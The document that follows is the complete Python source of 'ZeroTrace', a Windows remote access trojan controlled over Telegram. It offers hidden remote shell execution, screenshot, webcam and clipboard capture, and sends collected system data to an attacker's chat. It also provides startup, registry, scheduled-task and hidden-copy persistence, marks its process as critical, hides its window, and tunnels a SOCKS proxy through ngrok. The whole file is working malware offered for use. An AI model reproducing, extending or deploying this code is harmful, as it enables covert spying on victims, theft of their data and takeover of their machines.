# ZeroTrace - ZeroRAT
# GitHub: https://github.com/jfrzz/ZeroTrace
# Version: 1.0
# Author: JfrzXCode

import asyncio
import platform
import subprocess
import ctypes
import os
import uuid
import socket
import tkinter as tk
import sqlite3
import tempfile
import time
import sys
import webbrowser
import socks
import threading
import shutil
import psutil
import edge_tts
import miniupnpc
import requests
import win32clipboard
import sounddevice as sd
import datetime
import win32gui, win32con 
import mss
import cv2
import numpy as np
import soundfile as sf

from scipy.io.wavfile import read as wav_read
from plyer import notification
import winreg as reg
from pathlib import Path
from subprocess import CREATE_NO_WINDOW
from html import escape
from PIL import Image
from telegram import Update
from ctypes import cast, POINTER
from telegram.ext import (Application, CommandHandler, MessageHandler, filters, CallbackContext)
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL

BOT_TOKEN = ""
CHAT_ID = "" #Modify this and paste your chat id
TEMP_FOLDER = os.path.join(os.getenv('TEMP') or tempfile.gettempdir(), "system")
DB_FOLDER = f"{TEMP_FOLDER}/server.db"

os.makedirs(TEMP_FOLDER, exist_ok=True)

##################### SYSTEM INFO ######################
CPU_CORES = psutil.cpu_count(logical=True)
TOTAL_RAM = round(psutil.virtual_memory().total / (1024 * 1024), 2)
ARCHITECTURE = platform.architecture()[0]
SYSTEM_TYPE = platform.system()
OS_VERSION = platform.version()
MACHINE_TYPE = platform.machine()
CPU_NAME = platform.processor() or "Unknown"
DISK = psutil.disk_usage('/')
TOTAL_DISK, USED_DISK, FREE_DISK = [round(x / (1024**3), 2) for x in [DISK.total, DISK.used, DISK.free]]
MAC_ADDRESS = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 2*6, 8)][::-1])
UPTIME_HOURS = round((time.time() - psutil.boot_time()) / 3600, 2)
def getip() -> str:
    try:
        return requests.get("https://api.ipify.org").text
    except requests.exceptions.ConnectionError:
        return "None"
IP = getip()
HOSTNAME = socket.gethostname()
DATE = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
ADMIN = os.geteuid() == 0 if hasattr(os, "geteuid") else os.system("net session >nul 2>&1") == 0
########################################################

def download_from_github(url):
    """Download a file from a GitHub URL and save it in the TEMP folder."""
    if "blob" in url:
        url = url.replace("blob/", "")  # Convert to raw URL
        url = url.replace("github.com", "raw.githubusercontent.com")
    
    filename = url.split("/")[-1]  # Extract filename from URL
    save_path = os.path.join(TEMP_FOLDER, filename)  # Save in temp folder
    
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an error for bad responses (4xx, 5xx)

        with open(save_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        
        return save_path
    except requests.RequestException as e:
        return None

def insert_system_info():
    conn = sqlite3.connect(DB_FOLDER)
    cursor = conn.cursor()

    try:
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hostname TEXT NOT NULL,
                ip TEXT NOT NULL,
                admin TEXT NOT NULL,
                date TEXT NOT NULL,
                cpu_cores INTEGER NOT NULL,
                total_ram REAL NOT NULL,
                architecture TEXT NOT NULL,
                system_type TEXT NOT NULL,
                os_version TEXT NOT NULL,
                machine_type TEXT NOT NULL,
                cpu_name TEXT NOT NULL,
                total_disk REAL NOT NULL,
                used_disk REAL NOT NULL,
                free_disk REAL NOT NULL,
                mac_address TEXT NOT NULL,
                uptime_hours REAL NOT NULL
            )
        """)

        cursor.execute("""
            INSERT INTO info (
                hostname, ip, admin, date, cpu_cores, total_ram, architecture, system_type,
                os_version, machine_type, cpu_name, total_disk, used_disk, free_disk, mac_address, uptime_hours
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (HOSTNAME, IP, str(ADMIN), DATE, CPU_CORES, TOTAL_RAM, ARCHITECTURE, SYSTEM_TYPE,
              OS_VERSION, MACHINE_TYPE, CPU_NAME, TOTAL_DISK, USED_DISK, FREE_DISK, MAC_ADDRESS, UPTIME_HOURS))

        conn.commit()
    except Exception as e:
        print(f"Database error: {e}")
    finally:
        conn.close()
        
banner = fr"""
 _____              _____                    
/ _  / ___ _ __ ___/__   \_ __ __ _  ___ ___ 
\// / / _ | '__/ _ \ / /\| '__/ _` |/ __/ _ \
 / //|  __| | | (_) / /  | | | (_| | (_|  __/   Version: 1.0
/____/\___|_|  \___/\/   |_|  \__,_|\___\___|   Author: @JfrzxCode
"""

info = f"""
<b>New Client | Status : Connected</b>

<b>Ip :</b> <code>{IP}</code>
<b>Hostname :</b> <code>{HOSTNAME}</code>
<b>Date :</b> <code>{DATE}</code>
<b>Admin :</b> <code>{'Yes' if ADMIN else 'No'}</code>
"""

########################################## COMMANDS ##########################################

async def msgbox(update: Update, context):
    try:
        if context.args:
            message = ' '.join(context.args)
            await update.message.reply_text(f"<b>Message box displayed : {message}</b>", parse_mode='HTML')
            ctypes.windll.user32.MessageBoxW(0, message, "Message", 0x40 | 0x1)
        else:
            await update.message.reply_text("<b>Usage : /msgbox [message]</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def notify(update: Update, context):
    try:
        if context.args:
            message = ' '.join(context.args)
            await update.message.reply_text(f"<b>Notification sent : {message}</b>", parse_mode='HTML')
            notification.notify(
                title="Message Notification",
                message=message,
                timeout=5
            )
        else:
            await update.message.reply_text("<b>Usage : /notify [message]</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def shell(update: Update, context):
    try:
        if context.args:
            command = ' '.join(context.args)
            result = result = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
            await update.message.reply_text(f"<b>{escape(result.stdout)}</b>", parse_mode='HTML')
        else:
            await update.message.reply_text("<b>Usage : /shell [command]</b>", parse_mode='HTML')
    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f"<b>ERROR : {escape(e.stderr)}</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def screenshot(update: Update, context):
    try:
        with mss.mss() as sct:
            screenshot_path = os.path.join(TEMP_FOLDER, "screenshot.png")
            sct.shot(output=screenshot_path)
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, 'rb'))
            os.remove(screenshot_path)
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def webcam(update: Update, context):
    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            await update.message.reply_text("<b>ERROR : Could not open webcam</b>", parse_mode='HTML')
            return
        time.sleep(0.1)
        return_value, image = camera.read()
        if not return_value or image is None:
            camera.release()
            await update.message.reply_text("<b>ERROR : Failed to capture image</b>", parse_mode='HTML')
            return
        path = os.path.join(TEMP_FOLDER, "webcam_pic.png")
        cv2.imwrite(path, image)
        camera.release()
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(path, 'rb'))
        os.remove(path)
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def clipboard(update: Update, context):
    try:
        win32clipboard.OpenClipboard()
        data = []
        for f in (win32clipboard.CF_UNICODETEXT, win32clipboard.CF_TEXT):
            if win32clipboard.IsClipboardFormatAvailable(f):
                try:
                    data.append(win32clipboard.GetClipboardData(f))
                except:
                    pass
        text = next((d for d in data if d), None)
        if text is None:
            await update.message.reply_text("<b>Clipboard Content :</b> <code>Clipboard is empty</code>", parse_mode='HTML')
        elif len(text) > 4000:
            await update.message.reply_text("<b>Clipboard Content :</b> <code>Clipboard content is too long</code>", parse_mode='HTML')
        else:
            await update.message.reply_text(f"<b>Clipboard Content :</b>\n\n<code>{escape(text)}</code>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')
    finally:
        win32clipboard.CloseClipboard()

async def maxvolume(update: Update, context):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        await update.message.reply_text("<b>Volume Set To Maximum</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def mutevolume(update: Update, context):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
        await update.message.reply_text("<b>Volume Set To Mute</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def critproc(update: Update, context):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        await update.message.reply_text("<b>Process Set To Critical</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def uncritproc(update: Update, context):
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
        await update.message.reply_text("<b>Critical Process Flag Removed</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def openurl(update: Update, context):
    args = context.args
    if not args:
        await update.message.reply_text("<b>Please provide a URL</b>", parse_mode='HTML')
    else:
        try:
            url = ''.join(args)
            if not any(url.startswith(prefix) for prefix in ['http://', 'https://']):
                url = f"http://{url}"
            webbrowser.open(url)
            await update.message.reply_text(f"<b>Opening :</b> <code>{escape(url)}</code>", parse_mode='HTML')
        except Exception as e:
            await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def shutdown(update: Update, context):
    try:
        await update.message.reply_text("<b>The computer has been shutdown</b>", parse_mode='HTML')
        os.system("shutdown /s /t 0")
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def restart(update: Update, context):
    try:
        await update.message.reply_text("<b>The computer has been restarted</b>", parse_mode='HTML')
        os.system("shutdown /r /t 0")
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def systeminfo(update: Update, context):
    system_info = f"""
<b>Host :</b> <code>{HOSTNAME}</code>
<b>IP :</b> <code>{IP}</code>
<b>MAC :</b> <code>{MAC_ADDRESS}</code>
<b>OS :</b> <code>{SYSTEM_TYPE} {platform.release()} ({OS_VERSION})</code>
<b>Architecture :</b> <code>{ARCHITECTURE}</code>
<b>Machine Type :</b> <code>{MACHINE_TYPE}</code>
<b>CPU :</b> <code>{CPU_NAME} ({CPU_CORES} cores)</code>                                  
<b>RAM :</b> <code>{TOTAL_RAM} MB</code>
<b>Disk :</b> <code>{TOTAL_DISK} GB total, {USED_DISK} GB used, {FREE_DISK} GB free</code>
<b>Uptime :</b> <code>{UPTIME_HOURS} hours</code>
"""
    await update.message.reply_text("<b>System Information :</b>", parse_mode='HTML')
    await update.message.reply_text(system_info, parse_mode='HTML')

async def getdb(update: Update, context):
    insert_system_info()
    with open(DB_FOLDER, "rb") as db_file:
        await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=db_file,
        filename="info.db"
        )
    os.remove(DB_FOLDER)

async def persistentKit(update: Update, context):
    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(__file__)
        
        file_name = os.path.basename(current_path)
        results = []
        
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            if not os.path.exists(startup_folder):
                os.makedirs(startup_folder)
            startup_path = os.path.join(startup_folder, file_name)
            shutil.copy2(current_path, startup_path)
            results.append("Added to Startup folder")
        except Exception as e:
            results.append(f"Startup folder failed: {str(e)}")
        
        try:
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            registry_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
            app_name = Path(file_name).stem
            reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, current_path)
            reg.CloseKey(registry_key)
            results.append("Added to Registry")
        except Exception as e:
            results.append(f"Registry failed: {str(e)}")
            
        try:
            app_name = Path(file_name).stem
            cmd = f'schtasks /create /tn "{app_name}" /tr "{current_path}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, check=True)
            results.append("Added as task")
        except Exception as e:
            results.append(f"Task failed: {str(e)}")
            
        try:
            hidden_dir = os.path.join(os.getenv('APPDATA'), ".cache")
            if not os.path.exists(hidden_dir):
                os.makedirs(hidden_dir)
            hidden_path = os.path.join(hidden_dir, f".{file_name}")
            shutil.copy2(current_path, hidden_path)
            subprocess.call(["attrib", "+H", hidden_path])
            results.append("Created hidden copy")
        except Exception as e:
            results.append(f"Hidden copy failed: {str(e)}")
            
        status_message = "<b>Persistence kit Results :</b>\n\n" + "\n".join(results)
        await update.message.reply_text(status_message, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR:</b> <pre>{str(e)}</pre>", parse_mode='HTML')

async def removePersistence(update: Update, context):
    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(__file__)
        
        file_name = os.path.basename(current_path)
        app_name = Path(file_name).stem
        results = []
        
        # Remove from Startup folder
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 
                r'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_path = os.path.join(startup_folder, file_name)
            
            if os.path.exists(startup_path):
                os.remove(startup_path)
                results.append("Removed from Startup folder")
            else:
                results.append("Not found in Startup folder")
        except Exception as e:
            results.append(f"Startup folder removal failed: {str(e)}")
        
        # Remove from Registry
        try:
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            registry_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
            
            try:
                reg.DeleteValue(registry_key, app_name)
                results.append("Removed from Registry")
            except FileNotFoundError:
                results.append("Not found in Registry")
            finally:
                reg.CloseKey(registry_key)
        except Exception as e:
            results.append(f"Registry removal failed: {str(e)}")
            
        # Remove scheduled task
        try:
            cmd = f'schtasks /delete /tn "{app_name}" /f'
            subprocess.run(cmd, shell=True, check=False, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            results.append("Removed scheduled task")
        except Exception as e:
            results.append(f"Task removal failed: {str(e)}")
            
        # Remove hidden copy
        try:
            hidden_dir = os.path.join(os.getenv('APPDATA'), ".cache")
            hidden_path = os.path.join(hidden_dir, f".{file_name}")
            
            if os.path.exists(hidden_path):
                os.remove(hidden_path)
                results.append("Removed hidden copy")
            else:
                results.append("Hidden copy not found")
        except Exception as e:
            results.append(f"Hidden copy removal failed: {str(e)}")
            
        status_message = "<b>Persistence Removal Results :</b>\n\n" + "\n".join(results)
        await update.message.reply_text(status_message, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}", parse_mode='HTML')
async def detach(update: Update, context):
    try:
        await update.message.reply_text("Detaching and stopping bot...", parse_mode='HTML')
        async def delayed_exit():
            if hasattr(context.bot, 'close'):
                await context.bot.close()
            
            if hasattr(context.application, 'stop'):
                await context.application.stop()
            import asyncio
            await asyncio.sleep(1)
            os._exit(0)
        context.application.create_task(delayed_exit())
    except Exception as e:
        try:
            await update.message.reply_text(f"Detach ERROR: {str(e)}", parse_mode='HTML')
        finally:
            os._exit(1)

async def request_audio(update: Update, context: CallbackContext):
    await update.message.reply_text("<b>Send me an audio file to play.</b>", parse_mode='HTML')

async def playsound(update: Update, context: CallbackContext):
    try:
        audio = update.message.audio or update.message.voice
        if not audio:
            await update.message.reply_text("<b>No audio file received.</b>", parse_mode='HTML')
            return
        file_id = audio.file_id
        new_file = await context.bot.get_file(file_id)
        with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as temp_audio:
            file_path = temp_audio.name
        await new_file.download_to_drive(file_path)
        wav_path = file_path.replace(".mp3", ".wav")
        data, samplerate = sf.read(file_path)
        sf.write(wav_path, data, samplerate)
        await update.message.reply_text("<b>Audio is playing...</b>", parse_mode='HTML')
        samplerate, data = wav_read(wav_path)
        data = data.astype(np.float32) / 32768
        sd.play(data, samplerate)
        sd.wait()
        await asyncio.sleep(5)
        os.remove(file_path)
        os.remove(wav_path)
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR: {str(e)}</b>", parse_mode='HTML')

async def say(update: Update, context: CallbackContext):
    try:
        if context.args:
            text = ' '.join(context.args)
            voice = "en-US-SteffanNeural"
            with tempfile.NamedTemporaryFile(suffix=".mp3", delete=False) as temp_audio:
                temp_path = temp_audio.name
            tts = edge_tts.Communicate(text, voice)
            await tts.save(temp_path)
            wav_path = temp_path.replace(".mp3", ".wav")
            data, samplerate = sf.read(temp_path)
            sf.write(wav_path, data, samplerate)
            samplerate, data = wav_read(wav_path)
            data = data.astype(np.float32) / 32768
            await update.message.reply_text(f"<b>Playing : {text}</b>", parse_mode='HTML')
            sd.play(data, samplerate)
            sd.wait()
            os.remove(temp_path)
            os.remove(wav_path)
        else:
            await update.message.reply_text("<b>Usage : /say [text]</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR : {str(e)}</b>", parse_mode='HTML')

async def request_photo(update: Update, context: CallbackContext):
    await update.message.reply_text("<b>Send me a photo to change the wallpaper.</b>", parse_mode='HTML')

async def changewallpaper(update: Update, context: CallbackContext):
    try:
        photo = update.message.photo[-1]
        file_id = photo.file_id
        new_file = await context.bot.get_file(file_id)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as temp_image:
            file_path = temp_image.name
        await new_file.download_to_drive(file_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 0)
        await update.message.reply_text("<b>Wallpaper has been change</b>", parse_mode="HTML")
        os.remove(file_path)
    except Exception as e:
        await update.message.reply_text(f"<b>ERROR: {str(e)}</b>", parse_mode='HTML')

################################### START PROXY SERVER ###################################

proxy_server = None  # Global variable for the proxy server
proxy_thread = None  # Global variable for the proxy thread
proxy_port = 1080  # Port for the proxy server
ngrok_process = None  # Store Ngrok process
ngrok_url = None  # Store Ngrok public address

class SocksProxyServer:
    def __init__(self, host="0.0.0.0", port=1080):
        self.host = host
        self.port = port
        self.running = False
        self.server = None

    def start(self):
        """Start the SOCKS5 proxy server."""
        try:
            self.server = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            self.running = True
            print(f"SOCKS5 Proxy started on {self.host}:{self.port}")

            while self.running:
                client_socket, addr = self.server.accept()
                print(f"New connection from {addr}")
                client_socket.close()  # Close immediately (for testing purposes)
        except Exception as e:
            print(f"Error starting proxy server: {e}")

    def stop(self):
        """Stop the SOCKS5 proxy server properly."""
        if self.running:
            self.running = False
            try:
                self.server.close()  # Close the socket safely
                print("SOCKS5 Proxy stopped")
            except Exception as e:
                print(f"Error while stopping the proxy: {e}")

def start_ngrok(port):
    """Start Ngrok TCP tunnel for the proxy."""
    global ngrok_process, ngrok_url

    # Start Ngrok in the background
    ngrok_process = subprocess.Popen(["ngrok", "tcp", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Wait for Ngrok to initialize
    time.sleep(5)

    # Retry fetching Ngrok public URL
    for _ in range(5):  # Retry 5 times
        try:
            response = requests.get("http://127.0.0.1:4040/api/tunnels")
            data = response.json()
            if "tunnels" in data and len(data["tunnels"]) > 0:
                ngrok_url = data["tunnels"][0]["public_url"].replace("tcp://", "")
                return ngrok_url
        except Exception as e:
            print(f"Ngrok error: {e}")
        time.sleep(2)  # Wait before retrying

    print("Ngrok failed to provide a public URL.")
    return None

def stop_ngrok():
    """Stop Ngrok tunnel."""
    global ngrok_process
    if ngrok_process:
        ngrok_process.terminate()
        ngrok_process = None
        print("Ngrok tunnel stopped.")

async def startproxy(update: Update, context: CallbackContext):
    global proxy_server, proxy_thread, ngrok_url, proxy_port

    if proxy_server and proxy_server.running:
        await update.message.reply_text("<b>Proxy is already running!</b>", parse_mode="HTML")
        return

    # Start the proxy server
    proxy_server = SocksProxyServer(port=proxy_port)
    proxy_thread = threading.Thread(target=proxy_server.start, daemon=True)
    proxy_thread.start()

    # Ensure the server has time to start
    time.sleep(2)

    # Start Ngrok tunnel
    ngrok_url = start_ngrok(proxy_port)

    if ngrok_url:
        proxy_info = f"<b>Proxy Started!</b>\n\nProxy Address: <code>{ngrok_url}</code>"
    else:
        proxy_info = "<b>Proxy started, but failed to get Ngrok URL.</b>"

    await update.message.reply_text(proxy_info, parse_mode="HTML")

async def stopproxy(update: Update, context: CallbackContext):
    global proxy_server, proxy_thread

    if proxy_server and proxy_server.running:
        proxy_server.stop()  # Stop the SOCKS5 server
        stop_ngrok()  # Stop Ngrok tunnel

        # Ensure the thread exits
        if proxy_thread:
            proxy_thread.join(timeout=1)
            proxy_thread = None  # Clear the thread reference

        await update.message.reply_text("<b>SOCKS5 Proxy stopped</b>", parse_mode="HTML")
    else:
        await update.message.reply_text("<b>No proxy is currently running</b>", parse_mode="HTML")

async def play_jumpscare(update: Update, context: CallbackContext):
    video_path = download_from_github("https://github.com/jfrzz/ZeroTrace/blob/main/assets/jumpscare.mp4")
    cap = cv2.VideoCapture(video_path)

    # Get screen resolution
    screen_width = 1920  # Change to your screen width
    screen_height = 1080  # Change to your screen height

    cv2.namedWindow("Jumpscare", cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty("Jumpscare", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break  # Stop if the video ends

        frame = cv2.resize(frame, (screen_width, screen_height))  # Resize to full screen
        cv2.imshow("Jumpscare", frame)

        if cv2.waitKey(30) & 0xFF == ord('q'):
            break  # Press 'q' to exit

    cap.release()
    cv2.destroyAllWindows()
    await update.message.reply_text("```\n<b>Jumpscare video played.</b>\n```", parse_mode='HTML')
    os.remove(video_path)

###################################################################################################

########################################  FAKE ADMIN LOGIN  #######################################

#Coming soon..

###################################################################################################

######################################## TELEGRAM BOT SETUP #######################################

async def chat():
    """Send a startup message to Telegram when the bot starts."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": "```\n*ZeroTrace : New Client!*\n```", "parse_mode": "MarkdownV2"}

    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        pass
        
async def start(update: Update, context):
    await update.message.reply_text(f"```\n{banner}\n```", parse_mode='Markdown')
    await update.message.reply_text(f"{info}", parse_mode='HTML')
    await asyncio.sleep(1)
    await update.message.reply_text("<b>Type /help to show the list of available command</b>", parse_mode='HTML')

async def help_command(update: Update, context):
    help_text = """
<b>Commands</b>

<b>/start</b> - Show the client info (also shows the help message)
<b>/help</b> - Show this help message

<b>/shutdown</b> - Shutdown the computer
<b>/restart</b> - Restart the computer
<b>/screenshot</b> - Take a screenshot of the current screen
<b>/webcam</b> - Capture a picture from the default webcam
<b>/clipboard</b> - Get the content of the clipboard
<b>/maxvolume</b> - Set the volume to maximum
<b>/mutevolume</b> - Set the volume to mute
<b>/critproc</b> - Set the current process to critical
<b>/uncritproc</b> - Remove the critical process flag
<b>/openurl [URL]</b> - Open a URL in the default web browser
<b>/getdb</b> - Get the database containing all the information
<b>/systeminfo</b> - Get system information (CPU, RAM, disk, etc.)
<b>/msgbox [MESSAGE]</b> - Show a message box with the provided message.
<b>/notify [MESSAGE]</b> - Show a notification with the provided message.
<b>/shell [COMMAND]</b> - Execute a shell command and send the output as a message.
<b>/persistentkit</b> - Add the bot to startup, registry, and task scheduler for persistence.
<b>/removepersistence</b> - Remove's the persistence kit
<b>/detach</b> - Detach the bot from the current session and stop it.
<b>/changewallpaper</b> - Change the desktop wallpaper to the last received photo.
<b>/playsound</b> - Play an audio file from the user's device.
<b>/jumpscare</b> - Play a jumpscare video
<b>/say [TEXT]</b> - Play a audio using text to speech
<b>/startproxy</b> - Start a proxy server on port 1080
<b>/stopproxy</b> - Stop the proxy server

"""
    await update.message.reply_text(help_text, parse_mode='HTML')

async def invalid_command(update: Update, context):
    await update.message.reply_text("<b>Invalid Command.</b>", parse_mode="HTML")
async def run_bot():
    while True:
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            
            app.add_handler(CommandHandler('start', start))
            app.add_handler(CommandHandler('help', help_command))
            app.add_handler(CommandHandler('screenshot', screenshot))
            app.add_handler(CommandHandler('webcam', webcam))
            app.add_handler(CommandHandler('clipboard', clipboard))
            app.add_handler(CommandHandler('maxvolume', maxvolume))
            app.add_handler(CommandHandler('mutevolume', mutevolume))
            app.add_handler(CommandHandler('critproc', critproc))
            app.add_handler(CommandHandler('uncritproc', uncritproc))
            app.add_handler(CommandHandler('openurl', openurl))
            app.add_handler(CommandHandler('shutdown', shutdown))
            app.add_handler(CommandHandler('restart', restart))
            app.add_handler(CommandHandler('getdb', getdb))
            app.add_handler(CommandHandler('systeminfo', systeminfo))
            app.add_handler(CommandHandler('msgbox', msgbox))
            app.add_handler(CommandHandler('shell', shell))
            app.add_handler(CommandHandler('notify', notify))
            app.add_handler(CommandHandler('persistentkit', persistentKit))
            app.add_handler(CommandHandler('removepersistence', removePersistence))
            app.add_handler(CommandHandler('detach', detach))
            app.add_handler(CommandHandler('say', say))
            app.add_handler(CommandHandler('playsound', request_audio))
            app.add_handler(CommandHandler('jumpscare', play_jumpscare))
            app.add_handler(CommandHandler('changewallpaper', request_photo))
            app.add_handler(CommandHandler('startproxy', startproxy))
            app.add_handler(CommandHandler('stopproxy', stopproxy))
            app.add_handler(MessageHandler(filters.PHOTO, changewallpaper))
            app.add_handler(MessageHandler(filters.AUDIO, playsound))
            app.add_handler(MessageHandler(filters.COMMAND, invalid_command))
            app.add_handler(MessageHandler(filters.TEXT, invalid_command))
            print("\n[ BOT IS RUNNING... ]\n")
            await app.initialize()
            await app.start()
            await app.updater.start_polling()
            await chat()
            try:
                await asyncio.Future()
            except (KeyboardInterrupt, SystemExit):
                print("\n[SHUTDOWN... ]\n")
            finally:
                await app.stop()
                await app.shutdown()
                break
        except Exception as e:
            print(f"[ERROR]: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    while True:
        try:
            if sys.platform == 'win32':
                if getattr(sys, 'frozen', False):
                    window = win32gui.GetForegroundWindow()
                    win32gui.ShowWindow(window, win32con.SW_HIDE)
            jumpscare_path = download_from_github("https://github.com/jfrzz/ZeroTrace/blob/main/assets/jumpscare.mp4")
            asyncio.run(run_bot())
        except KeyboardInterrupt:
            print("\n[KeyboardInterrupt detected. Shutting down... ]\n")
            break
        except Exception as e:
            print(f"[Critical Error]: {e}")
            print("[Restarting in 5 seconds...]\n")
            asyncio.sleep(5)

###################################################################################################
